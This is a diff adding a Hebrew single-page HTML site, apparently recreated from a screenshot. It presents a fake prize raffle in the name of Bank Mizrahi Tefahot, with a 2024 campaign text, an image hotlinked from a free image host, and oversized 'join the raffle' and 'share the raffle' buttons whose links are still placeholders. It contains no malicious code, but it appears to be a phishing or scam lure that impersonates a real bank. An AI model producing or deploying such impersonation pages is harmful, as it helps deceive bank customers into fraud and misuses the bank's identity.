@@ -1,0 +1,168 @@
+<!doctype html>
+<html lang="he" dir="rtl">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>הגרלה - דף יחיד</title>
+
+  <!-- Google font good for Hebrew -->
+  <link href="https://fonts.googleapis.com/css2?family=Alef:wght@300;400;700&display=swap" rel="stylesheet">
+
+  <style>
+    :root{
+      --blue:#134b75;
+      --orange:#ff7a00;
+      --bg:#ffffff;
+      --light-gray:#e6e6e6;
+      --border-gray:#bfbfbf;
+    }
+
+    html,body{
+      height:100%;
+      margin:0;
+      background:var(--bg);
+      font-family: "Alef", system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+      color:var(--blue);
+      -webkit-font-smoothing:antialiased;
+      -moz-osx-font-smoothing:grayscale;
+      direction:rtl;
+    }
+
+    /* Page layout */
+    .page {
+      min-height:100vh;
+      display:flex;
+      align-items:flex-start;
+      justify-content:center;
+      padding:40px 20px;
+      box-sizing:border-box;
+    }
+
+    /* Left vertical bar like in screenshot */
+    .left-bar {
+      position:fixed;
+      left:calc(50% - 380px); /* aligns relative to .card center width 760px */
+      top:20px;
+      bottom:20px;
+      width:8px;
+      background:linear-gradient(#cfcfcf,#c3c3c3);
+      border-radius:4px;
+      box-shadow:inset 0 0 0 1px rgba(0,0,0,0.02);
+    }
+
+    .card {
+      width:760px; /* similar width in screenshot */
+      max-width:95%;
+      background:transparent;
+      box-sizing:border-box;
+      padding:0 40px;
+      text-align:center;
+    }
+
+    /* The top image the user provided */
+    .top-image {
+      display:block;
+      margin:0 auto 20px auto;
+      max-width:380px; /* keep it smaller so logo area + design remain balanced */
+      width:100%;
+      height:auto;
+      object-fit:contain;
+    }
+
+    h1.logo {
+      margin:6px 0 28px 0;
+      font-size:34px;
+      font-weight:700;
+      color:var(--blue);
+      letter-spacing:1px;
+    }
+
+    .lead {
+      font-size:34px;
+      line-height:1.6;
+      font-weight:700;
+      max-width:100%;
+      margin:6px auto 24px auto;
+      color:var(--blue);
+    }
+
+    .sub {
+      font-size:26px;
+      line-height:1.9;
+      font-weight:400;
+      margin-bottom:34px;
+      color:var(--blue);
+    }
+
+    .choose {
+      font-size:26px;
+      font-weight:700;
+      margin:26px 0 40px 0;
+      color:var(--blue);
+    }
+
+    /* Buttons */
+    .btn {
+      display:block;
+      width:100%;
+      max-width:700px;
+      margin:22px auto;
+      background:var(--orange);
+      color:white;
+      border:none;
+      outline:none;
+      padding:28px 40px;
+      border-radius:60px;
+      font-size:28px;
+      font-weight:700;
+      box-shadow: 0 10px 30px rgba(15, 20, 80, 0.12), 0 0 30px rgba(130, 100, 255, 0.14);
+      cursor:pointer;
+      text-decoration:none;
+      transition:transform .12s ease, box-shadow .12s ease;
+      text-align:center;
+    }
+
+    .btn:hover{ transform:translateY(-3px); box-shadow: 0 18px 40px rgba(15,20,80,0.14), 0 0 40px rgba(130,100,255,0.18); }
+
+    /* Make sure buttons look like big pill-shape like in image */
+    .btn.small { padding:20px 30px; font-size:22px; }
+
+    /* Spacer to mimic screenshot whitespace */
+    .spacer { height:40px; }
+
+    @media (max-width:640px){
+      .lead{ font-size:26px; }
+      .sub{ font-size:20px; }
+      .choose{ font-size:20px; }
+      .btn{ font-size:20px; padding:20px 24px; max-width:100%; }
+      .left-bar { left:6px; } /* keep left bar visible on small screens */
+    }
+  </style>
+</head>
+<body>
+  <div class="page">
+    <div class="left-bar" aria-hidden="true"></div>
+
+    <main class="card" role="main" aria-label="עמוד ההגרלה">
+      <!-- The image you supplied shown at the top as requested -->
+      <img class="top-image" src="https://www2.0zz0.com/2025/10/20/18/772546082.jpeg" alt="תמונה שנשלחה" />
+
+      <!-- Recreated content (Hebrew text as in the screenshot) -->
+      <h1 class="logo">עם בנק מזרחי טפחות</h1>
+
+      <p class="lead">עם הקמפיין לשנת 2024, הפרסים שלנו שונים על פי</p>
+
+      <p class="sub">ערכם ומספרם, וכוללים פרסים גדולים ויומיים, שבועיים, חודשיים ומשולשים לכל לקוחותינו.</p>
+
+      <p class="choose">בחר את השירות המתאים לך</p>
+
+      <!-- Large orange pill buttons like the image -->
+      <a class="btn" href="#" role="button" aria-label="שתפו את ההגרלה">שתפו את ההגרלה</a>
+
+      <a class="btn" href="#" role="button" aria-label="להשתתפות בהגרלה לחצו כאן">להשתתפות בהגרלה לחצו כאן</a>
+
+      <div class="spacer"></div>
+    </main>
+  </div>
+</body>
+</html>
